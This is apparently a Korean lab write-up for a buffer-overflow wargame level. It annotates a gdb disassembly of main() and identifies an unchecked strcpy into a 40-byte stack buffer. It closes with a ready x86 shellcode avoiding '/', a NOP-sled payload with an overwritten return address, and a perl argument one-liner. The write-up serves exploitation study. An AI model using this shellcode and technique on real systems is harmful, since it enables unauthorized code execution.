@@ -1,0 +1,173 @@
+[어셈블리보고 코드 맞춰보기]
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048500 <main>:       push   %ebp
+0x8048501 <main+1>:     mov    %ebp,%esp
+-main()프롤로그
+0x8048503 <main+3>:     sub    %esp,44
+-메모리 할당
+0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],2
+-argc와 2를 비교
+0x804850a <main+10>:    je     0x8048523 <main+35>
+-둘이 같으면 jump
+0x804850c <main+12>:    push   0x8048690
+0x8048511 <main+17>:    call   0x8048410 <printf>
+0x8048516 <main+22>:    add    %esp,4
+-printf("문자열") 호출 및 인자삭제
+0x8048519 <main+25>:    push   0
+0x804851b <main+27>:    call   0x8048420 <exit>
+0x8048520 <main+32>:    add    %esp,4
+-exit(0) 호출 및 인자 삭제
+0x8048523 <main+35>:    nop
+
+0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
+-[%ebp-44]에 0 삽입(int형 변수)
+0x804852b <main+43>:    nop
+(앞에 jmp문이 나오지 않는 않은 걸로 보아, 반복문임을 알 수 있음.)
+*nop이 있는 어셈블리 명령어는 조건문이나 반복문에서의 jump의 목적지로 사용됨.
+0x804852c <main+44>:    lea    %esi,[%esi*1]
+0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
+0x8048533 <main+51>:    lea    %edx,[%eax*4]
+0x804853a <main+58>:    mov    %eax,%ds:0x80497cc
+0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
+-[%ds:0x80497cc]에 위치한 배열(4바이트 단위)의 %edx번째 값과 0을 비교
+0x8048543 <main+67>:    jne    0x8048547 <main+71>
+-같지 않으면 아래로(to main+71) 쭉 이동
+0x8048545 <main+69>:    jmp    0x8048587 <main+135>
+-같으면 jump(to main+135)
+0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
+0x804854a <main+74>:    lea    %edx,[%eax*4]
+0x8048551 <main+81>:    mov    %eax,%ds:0x80497cc
+0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
+0x8048559 <main+89>:    push   %edx
+
+0x804855a <main+90>:    call   0x80483f0 <strlen>
+0x804855f <main+95>:    add    %esp,4
+strlen(([%ds:0x80497cc])[%ebp-44]) 호출 + 인자삭제
+0x8048562 <main+98>:    mov    %eax,%eax
+0x8048564 <main+100>:   push   %eax
+-strlen()의 반환값(%eax)을 push함.
+0x8048565 <main+101>:   push   0
+0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
+0x804856a <main+106>:   lea    %edx,[%eax*4]
+0x8048571 <main+113>:   mov    %eax,%ds:0x80497cc
+0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
+0x8048579 <main+121>:   push   %edx
+-([%ds:0x80497cc])[%ebp-44]) push
+0x804857a <main+122>:   call   0x8048430 <memset>
+0x804857f <main+127>:   add    %esp,12
+-memset(([%ds:0x80497cc])[%ebp-44],0,strlen([%ds:0x80497cc])) 호출 + 인자삭제
+
+0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
+-[%ebp-44]++
+0x8048585 <main+133>:   jmp    0x8048530 <main+48>
+- 반복문임을 알 수 있음(main+48에 nop인 것도 증거, [%ebp-44]를 반복 인자로 사용하고 있는 것으로 예상).
+0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
+0x804858a <main+138>:   add    %eax,4
+0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
+-%edx에 argv[1] 넣음.
+0x804858f <main+143>:   add    %edx,47
+0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
+argv[1][47]과 "0xbf"를 비교
+0x8048595 <main+149>:   je     0x80485b0 <main+176>
+-같으면 main+176으로 jump(조건문)
+0x8048597 <main+151>:   push   0x80486a3
+0x804859c <main+156>:   call   0x8048410 <printf>
+0x80485a1 <main+161>:   add    %esp,4
+-printf(문자열) 호출 및 인자삭제
+0x80485a4 <main+164>:   push   0
+0x80485a6 <main+166>:   call   0x8048420 <exit>
+0x80485ab <main+171>:   add    %esp,4
+-exit(0) 호출 및 인자삭제
+0x80485ae <main+174>:   mov    %esi,%esi
+0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485b3 <main+179>:   add    %eax,4
+0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
+0x80485b8 <main+184>:   push   %edx
+0x80485b9 <main+185>:   call   0x80483f0 <strlen>
+0x80485be <main+190>:   add    %esp,4
+
+0x80485c1 <main+193>:   mov    %eax,%eax
+0x80485c3 <main+195>:   cmp    %eax,48
+-strlen(argv[1])과 48을 비교
+0x80485c6 <main+198>:   jbe    0x80485e0 <main+224>
+- 크거나 같으면 main+224로 jump(조건문)
+0x80485c8 <main+200>:   push   0x80486c0
+0x80485cd <main+205>:   call   0x8048410 <printf>
+0x80485d2 <main+210>:   add    %esp,4
+-printf(문자열) 함수 호출 + 인자삭제
+0x80485d5 <main+213>:   push   0
+0x80485d7 <main+215>:   call   0x8048420 <exit>
+0x80485dc <main+220>:   add    %esp,4
+-exit(0) 호출+ 인자삭제
+0x80485df <main+223>:   nop
+
+0x80485e0 <main+224>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485e3 <main+227>:   add    %eax,4
+0x80485e6 <main+230>:   mov    %edx,DWORD PTR [%eax]
+0x80485e8 <main+232>:   push   %edx
+-argv[1]을 push
+0x80485e9 <main+233>:   lea    %eax,[%ebp-40]
+0x80485ec <main+236>:   push   %eax
+
+0x80485ed <main+237>:   call   0x8048440 <strcpy>
+0x80485f2 <main+242>:   add    %esp,8
+-strcpy([%ebp-40],argv[1])을 호출 + 인자삭제
+	-> argv[1]이 문자열이므로, [%ebp-40]이 char* 임을 알 수있음.
+0x80485f5 <main+245>:   lea    %eax,[%ebp-40]
+0x80485f8 <main+248>:   push   %eax
+0x80485f9 <main+249>:   push   0x80486d7
+0x80485fe <main+254>:   call   0x8048410 <printf>
+0x8048603 <main+259>:   add    %esp,8
+-printf(문자열,[%ebp-40]) 호출 + 인자삭제
+0x8048606 <main+262>:   push   40
+0x8048608 <main+264>:   push   0
+0x804860a <main+266>:   lea    %eax,[%ebp-40]
+0x804860d <main+269>:   push   %eax
+0x804860e <main+270>:   call   0x8048430 <memset>
+0x8048613 <main+275>:   add    %esp,12
+-memset([%ebp-40],0,40) 호출 + 인자삭제
+0x8048616 <main+278>:   mov    %eax,DWORD PTR [%ebp+12]
+0x8048619 <main+281>:   add    %eax,4
+0x804861c <main+284>:   mov    %edx,DWORD PTR [%eax]
+0x804861e <main+286>:   push   %edx
+0x804861f <main+287>:   call   0x80483f0 <strlen>
+0x8048624 <main+292>:   add    %esp,4
+-strlen(argv[1]) 호출 + 인자삭제
+0x8048627 <main+295>:   mov    %eax,%eax
+0x8048629 <main+297>:   push   %eax
+0x804862a <main+298>:   push   0
+0x804862c <main+300>:   mov    %eax,DWORD PTR [%ebp+12]
+0x804862f <main+303>:   add    %eax,4
+0x8048632 <main+306>:   mov    %edx,DWORD PTR [%eax]
+0x8048634 <main+308>:   push   %edx
+0x8048635 <main+309>:   call   0x8048430 <memset>
+-memset(argv[1],0,strlen(argv[1])) 호출 + 인자삭제
+0x804863a <main+314>:   add    %esp,12
+0x804863d <main+317>:   leave
+0x804863e <main+318>:   ret
+-main함수 종료
+0x804863f <main+319>:   nop
+
+----------------------------------------------------------------------------------
+
+[페이로드 작성]
+*실행파일(심볼릭링크)에 "\x2f"는 ASCII로 "/"를 의미하기 때문에 넣으면 잘 안됨.*
+
+["\x2f"포함하지 않은 쉘코드]
+\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+
+-> argv[0]의 주소는 0xbffffb44
+
+[페이로드]
+
+buffer[40] + ebp[4] + RET[4] + argc[4] + argv[4]+ ..
+"\x90"x40, "AAAA", "\x44\xfb\xff\xbf","NOPslide+쉘코드"
+
+※실행 파일 지정법 주의사항 :
+*무조건 심볼릭 링크는 페이로드에도 풀 네임으로 들어가야함!!!*
+
+인자:
+`perl -e 'print "\x90"x44,"\x44\xfb\xff\xbf"'`
+
